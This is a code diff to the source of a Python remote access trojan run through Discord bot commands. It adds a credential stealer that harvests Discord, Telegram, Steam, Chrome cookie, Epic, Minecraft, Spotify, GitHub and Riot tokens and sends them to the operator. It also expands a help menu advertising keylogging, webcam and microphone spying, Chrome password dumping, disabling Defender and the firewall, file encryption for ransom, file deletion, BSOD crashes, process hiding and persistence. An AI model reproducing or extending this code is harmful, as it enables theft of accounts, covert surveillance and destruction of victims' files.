@@ -209,18 +209,163 @@ def get_wifipasswords():
         pass
     return profiles
 
-def grab_discord_tokens():
+def grab_all_tokens():
+    """Grab tokens from Discord, Telegram, Steam, and other apps"""
     tokens = []
-    paths = [os.path.expanduser("~") + r"\AppData\Roaming\Discord\Local Storage\leveldb", os.path.expanduser("~") + r"\AppData\Roaming\DiscordPTB\Local Storage\leveldb", os.path.expanduser("~") + r"\AppData\Roaming\DiscordCanary\Local Storage\leveldb"]
-    for path in paths:
+    detected_apps = []
+    
+    # Discord tokens
+    discord_paths = [
+        os.path.expanduser("~") + r"\AppData\Roaming\Discord\Local Storage\leveldb",
+        os.path.expanduser("~") + r"\AppData\Roaming\DiscordPTB\Local Storage\leveldb",
+        os.path.expanduser("~") + r"\AppData\Roaming\DiscordCanary\Local Storage\leveldb",
+        os.path.expanduser("~") + r"\AppData\Roaming\Lightcord\Local Storage\leveldb",
+        os.path.expanduser("~") + r"\AppData\Roaming\Opera Software\Opera Stable\Local Storage\leveldb"
+    ]
+    
+    for path in discord_paths:
         if os.path.exists(path):
-            for file in os.listdir(path):
-                if file.endswith((".log", ".ldb")):
-                    with open(os.path.join(path, file), 'r', errors='ignore') as f:
+            detected_apps.append("Discord")
+            try:
+                for file in os.listdir(path):
+                    if file.endswith((".log", ".ldb")):
+                        with open(os.path.join(path, file), 'r', errors='ignore') as f:
+                            data = f.read()
+                            matches = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', data)
+                            for match in matches:
+                                tokens.append(f"🟣 Discord Token: {match}")
+                            matches = re.findall(r'mfa\.[\w-]{84}', data)
+                            for match in matches:
+                                tokens.append(f"🟣 Discord MFA: {match}")
+            except:
+                pass
+    
+    # Telegram tokens
+    telegram_paths = [
+        os.path.expanduser("~") + r"\AppData\Roaming\Telegram Desktop\tdata",
+        os.path.expanduser("~") + r"\AppData\Roaming\Telegram Desktop\tdummy"
+    ]
+    for path in telegram_paths:
+        if os.path.exists(path):
+            detected_apps.append("Telegram")
+            try:
+                for file in os.listdir(path):
+                    if file.endswith(".s"):
+                        with open(os.path.join(path, file), 'rb') as f:
+                            data = f.read()
+                            matches = re.findall(rb'\d+:[a-zA-Z0-9_-]{35}', data)
+                            for match in matches:
+                                tokens.append(f"🔵 Telegram: {match.decode('utf-8', errors='ignore')}")
+            except:
+                pass
+    
+    # Steam
+    steam_path = os.path.expanduser("~") + r"\AppData\Local\Steam\config\loginusers.vdf"
+    if os.path.exists(steam_path):
+        detected_apps.append("Steam")
+        try:
+            with open(steam_path, 'r', errors='ignore') as f:
+                data = f.read()
+                matches = re.findall(r'"AccountName"\s*"([^"]+)"', data)
+                for match in matches:
+                    tokens.append(f"🎮 Steam Account: {match}")
+        except:
+            pass
+    
+    # Chrome cookies (OAuth tokens)
+    chrome_path = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default"
+    if os.path.exists(chrome_path):
+        detected_apps.append("Chrome")
+        try:
+            cookies_db = os.path.join(chrome_path, "Cookies")
+            if os.path.exists(cookies_db):
+                temp_db = os.environ['TEMP'] + "\\cookies.db"
+                shutil.copy2(cookies_db, temp_db)
+                conn = sqlite3.connect(temp_db)
+                cursor = conn.cursor()
+                cursor.execute("SELECT host_key, name FROM cookies WHERE name LIKE '%token%' OR name LIKE '%auth%' OR name LIKE '%session%'")
+                for host, name in cursor.fetchall():
+                    tokens.append(f"🍪 Cookie: {host} - {name}")
+                conn.close()
+                os.remove(temp_db)
+        except:
+            pass
+    
+    # Epic Games
+    epic_path = os.path.expanduser("~") + r"\AppData\Local\Epic Games\Launcher\Saved\Config\Windows\GameUserSettings.ini"
+    if os.path.exists(epic_path):
+        detected_apps.append("Epic Games")
+        try:
+            with open(epic_path, 'r', errors='ignore') as f:
+                data = f.read()
+                matches = re.findall(r'[a-f0-9]{32}', data)
+                for match in matches:
+                    tokens.append(f"🎯 Epic Games: {match}")
+        except:
+            pass
+    
+    # Minecraft
+    mc_paths = [
+        os.path.expanduser("~") + r"\AppData\Roaming\.minecraft\launcher_profiles.json",
+        os.path.expanduser("~") + r"\AppData\Roaming\.minecraft\usercache.json"
+    ]
+    for path in mc_paths:
+        if os.path.exists(path):
+            detected_apps.append("Minecraft")
+            try:
+                with open(path, 'r', errors='ignore') as f:
+                    data = f.read()
+                    matches = re.findall(r'"accessToken":"([^"]+)"', data)
+                    for match in matches:
+                        tokens.append(f"⛏️ Minecraft: {match[:20]}...")
+            except:
+                pass
+    
+    # Spotify
+    spotify_path = os.path.expanduser("~") + r"\AppData\Roaming\Spotify\Users"
+    if os.path.exists(spotify_path):
+        detected_apps.append("Spotify")
+        try:
+            for file in os.listdir(spotify_path):
+                if file.endswith(".json"):
+                    with open(os.path.join(spotify_path, file), 'r', errors='ignore') as f:
                         data = f.read()
-                        tokens.extend(re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', data))
-                        tokens.extend(re.findall(r'mfa\.[\w-]{84}', data))
-    return list(set(tokens))
+                        matches = re.findall(r'"accessToken":"([^"]+)"', data)
+                        for match in matches:
+                            tokens.append(f"🎵 Spotify: {match[:30]}...")
+        except:
+            pass
+    
+    # GitHub (Windows Credential Manager)
+    try:
+        import win32cred
+        creds = win32cred.CredEnumerate(None, 0)
+        for cred in creds:
+            if 'github' in cred['TargetName'].lower() or 'token' in cred['TargetName'].lower():
+                detected_apps.append("GitHub")
+                tokens.append(f"🐙 GitHub: {cred['TargetName']}")
+                break
+    except:
+        pass
+    
+    # Riot Games
+    riot_path = os.path.expanduser("~") + r"\AppData\Local\Riot Games\Riot Client\Data"
+    if os.path.exists(riot_path):
+        detected_apps.append("Riot Games")
+        try:
+            for root, dirs, files in os.walk(riot_path):
+                for file in files:
+                    if file.endswith(".json"):
+                        with open(os.path.join(root, file), 'r', errors='ignore') as f:
+                            data = f.read()
+                            matches = re.findall(r'"[a-zA-Z0-9_-]{30,}"', data)
+                            for match in matches:
+                                if len(match) > 30:
+                                    tokens.append(f"🏹 Riot Games: {match[:30]}...")
+        except:
+            pass
+    
+    return tokens, list(set(detected_apps))
 
 def get_chrome_passwords():
     if not CRYPTO_AVAILABLE:
@@ -1139,19 +1284,30 @@ async def keylog_status(ctx):
 @bot.command(name='grabtokens')
 @is_authorized()
 async def grab_tokens(ctx):
-    await send_embed(ctx, "Grabbing", "Discord tokens...", discord.Color.blue())
-    tokens = grab_discord_tokens()
-    if tokens:
-        output = "\n".join(tokens)
+    await send_embed(ctx, "🔍 Scanning for Tokens", "Checking all installed apps...", discord.Color.blue())
+    tokens, detected = grab_all_tokens()
+    
+    if detected:
+        detected_str = "✅ Detected: " + ", ".join(detected)
+    else:
+        detected_str = "❌ No token-bearing apps detected"
+    
+    if tokens and tokens != ["No tokens found"]:
+        output = "\n".join(tokens[:50])
         if len(output) > 1900:
-            with open("tokens.txt", "w") as f:
-                f.write(output)
+            with open("tokens.txt", "w", encoding='utf-8') as f:
+                f.write("\n".join(tokens))
             await ctx.send(file=discord.File("tokens.txt"))
             os.remove("tokens.txt")
         else:
-            await send_embed(ctx, "Tokens", f"```{output}```", discord.Color.green())
+            embed = discord.Embed(title="🔑 Tokens Found", description=f"```{output}```", color=discord.Color.green())
+            embed.add_field(name="📊 Detected Apps", value=detected_str, inline=False)
+            embed.add_field(name="📈 Total Tokens", value=str(len(tokens)), inline=True)
+            await ctx.send(embed=embed)
     else:
-        await send_embed(ctx, "Tokens", "None found", discord.Color.red())
+        embed = discord.Embed(title="🔑 No Tokens Found", color=discord.Color.red())
+        embed.add_field(name="📊 Detected Apps", value=detected_str, inline=False)
+        await ctx.send(embed=embed)
 
 @bot.command(name='password')
 @is_authorized()
@@ -1169,7 +1325,7 @@ async def chrome_passwords(ctx):
             await ctx.send(file=discord.File("passwords.txt"))
             os.remove("passwords.txt")
         else:
-            await send_embed(ctx, "Chrome Passwords", f"```{output[:1500]}```", discord.Color.green())
+            await send_embed(ctx, "🔑 Chrome Passwords", f"```{output[:1500]}```", discord.Color.green())
     else:
         await send_embed(ctx, "Passwords", passwords[0] if passwords else "None found", discord.Color.red())
 
@@ -1437,72 +1593,72 @@ async def help_cmd(ctx):
     )
     
     categories = {
-        "Config": [
+        "🔧 Config": [
             f"**Prefix:** `{Config.PREFIX}`",
             f"**Whitelisted:** <@{Config.WHITELISTED[0]}>",
             f"**Main Channel:** <#{Config.MAIN_CHANNEL}>"
         ],
-        "System Info": [
-            "`info` - Get advanced system information",
+        "ℹ️ System Info": [
+            "`info` - Get advanced system information (HWID, CPU, GPU, RAM, IP, WiFi passwords)",
             "`sysinfo` - Alias for info",
-            "`idletime` - Check user idle time",
-            "`geolocate` - Get IP geolocation"
+            "`idletime` - Check how long the user has been idle",
+            "`geolocate` - Get IP geolocation (city, country, ISP, map link)"
         ],
-        "Destructive": [
-            "`lock` - Locks the PC",
-            "`crash` - Blue screens the PC (admin required)",
-            "`filescramble` - Renames all files randomly",
-            "`filedestroy` - Deletes all personal files",
-            "`fileransom` - Encrypts all files",
-            "`virus` - Displays fake virus messages",
-            "`delete` - Delete a file"
+        "💀 Destructive": [
+            "`lock` - Locks the PC (requires admin)",
+            "`crash` - Blue screens the PC (requires admin)",
+            "`filescramble` - Renames all personal files randomly",
+            "`filedestroy` - Deletes all personal files (⚠️ DANGEROUS)",
+            "`fileransom` - Encrypts all personal files (⚠️ DANGEROUS)",
+            "`virus` - Displays 10 fake virus warning popups",
+            "`delete <file>` - Delete a specific file"
         ],
-        "Messages & Alerts": [
-            "`voice [message]` - Text-to-speech message",
-            "`msgbox [message]` - Message box popup",
-            "`rickroll` - Opens Rickroll video"
+        "💬 Messages & Alerts": [
+            "`voice <message>` - Text-to-speech message",
+            "`msgbox <message>` - Message box popup on target PC",
+            "`rickroll` - Opens Rickroll video in browser"
         ],
-        "Control & Commands": [
+        "🎮 Control & Commands": [
             "`screenshot [name]` - Take screenshot",
-            "`open <app>` - Open an application",
-            "`close <app>` - Close an application",
+            "`open <app>` - Open application (notepad, calc, chrome, cmd)",
+            "`close <app>` - Close application by name",
             "`listapps [limit]` - List running applications",
-            "`cmd [command]` - Run a CMD command",
-            "`website <url>` - Open a website"
+            "`cmd <command>` - Run a CMD command on target",
+            "`website <url>` - Open a website in browser"
         ],
-        "Mouse & Keyboard": [
-            "`click [left|right|middle]` - Mouse click",
-            "`press <keys>` - Press keys (e.g. ctrl+c)",
-            "`blockinput` - Block keyboard/mouse (admin)",
+        "🖱️ Mouse & Keyboard": [
+            "`click [left|right|middle]` - Perform mouse click",
+            "`press <keys>` - Press keys (e.g. ctrl+c, alt+f4)",
+            "`blockinput` - Block keyboard/mouse (requires admin)",
             "`unblockinput` - Unblock keyboard/mouse",
-            "`shake <seconds>` - Shake cursor (5-300s)",
+            "`shake <seconds>` - Shake cursor rapidly (5-300s)",
             "`shakestop` - Stop cursor shaking"
         ],
-        "Power Control": [
+        "⚡ Power Control": [
             "`shutdown [delay]` - Shutdown PC",
             "`restart [delay]` - Restart PC",
-            "`critical` - Make process critical (admin)",
+            "`critical` - Make process critical (admin, closing causes BSOD)",
             "`rootkit` - Hide process as svchost.exe (admin)"
         ],
-        "Media & Audio": [
+        "🎵 Media & Audio": [
             "`playpause` - Play/Pause media",
-            "`nexttrack` - Next track",
+            "`nexttrack` - Skip to next track",
             "`mute` - Mute system audio",
             "`unmute` - Unmute system audio",
             "`capslock` - Toggle caps lock",
             "`capslockon` - Turn caps lock ON",
             "`capslockoff` - Turn caps lock OFF"
         ],
-        "Display": [
+        "🖥️ Display": [
             "`fullscreenlock` - Hide taskbar (fullscreen lock)",
             "`fullscreenunlock` - Show taskbar",
-            "`wallpaper` - Change wallpaper (attach image)"
+            "`wallpaper` - Change wallpaper (attach image to command)"
         ],
-        "Files & Navigation": [
-            "`cd [path]` - Change current directory",
+        "📂 Files & Navigation": [
+            "`cd <path>` - Change current directory",
             "`dir` - List current directory",
-            "`listfiles [directory]` - List files with details",
-            "`download <file>` - Download a file",
+            "`listfiles <directory>` - List files with sizes and emojis",
+            "`download <file>` - Download a file from target",
             "`upload` - Upload a file (attach to command)",
             "`downloads` - Show recent downloads",
             "`installed` - List installed programs",
@@ -1512,10 +1668,10 @@ async def help_cmd(ctx):
             "`videosfolder` - List Videos folder",
             "`desktopfolder` - List Desktop folder"
         ],
-        "Surveillance": [
+        "🎥 Surveillance": [
             "`webcampic` - Take webcam photo",
             "`camrec <seconds>` - Record webcam video (5-300s)",
-            "`mic <seconds>` - Record microphone (5-60s)",
+            "`mic <seconds>` - Record microphone (5-60s, requires PyAudio)",
             "`screenshot` - Take screenshot",
             "`clipboard` - Get clipboard contents",
             "`keylog start/stop/dump` - Keylogger control",
@@ -1525,24 +1681,24 @@ async def help_cmd(ctx):
             "`keylogclear` - Clear keylogger logs",
             "`keylogstatus` - Check keylogger status"
         ],
-        "Security & Stealing": [
-            "`grabtokens` - Grab Discord tokens",
-            "`password` - Dump Chrome passwords",
+        "🔐 Security & Stealing": [
+            "`grabtokens` - Grab tokens from: Discord, Telegram, Steam, Chrome, Epic Games, Minecraft, Spotify, GitHub, Riot Games",
+            "`password` - Dump Chrome saved passwords (requires pycryptodome)",
             "`disabledefender` - Disable Windows Defender (admin)",
             "`disablefirewall` - Disable Windows Firewall (admin)",
             "`disabletaskmgr` - Disable Task Manager",
             "`enabletaskmgr` - Enable Task Manager"
         ],
-        "Process Management": [
-            "`listprocess` - List all running processes",
+        "⚙️ Process Management": [
+            "`listprocess` - List all running processes with PID",
             "`prockill <name>` - Kill a process by name"
         ],
-        "Persistence": [
-            "`persistence` - Add to startup",
+        "🔁 Persistence": [
+            "`persistence` - Add to startup registry",
             "`startup add/remove` - Add/remove from startup",
             "`killswitch` - Clean traces and exit"
         ],
-        "Bot": [
+        "🤖 Bot": [
             "`exit` - Closes the RAT and exits"
         ]
     }
